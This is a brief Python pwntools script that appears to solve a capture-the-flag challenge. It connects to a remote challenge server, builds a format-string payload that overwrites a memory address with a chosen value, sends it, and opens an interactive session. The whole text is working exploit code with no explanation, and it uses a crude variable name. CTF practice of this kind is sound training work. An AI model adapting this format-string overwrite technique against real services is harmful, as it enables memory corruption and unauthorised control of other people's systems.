from pwn import *
r = remote('pwn2.jarvisoj.com',9895)
fuck = fmtstr_payload(11,{0x804A02C:4})
print(fuck)
r.sendline(fuck)
r.interactive()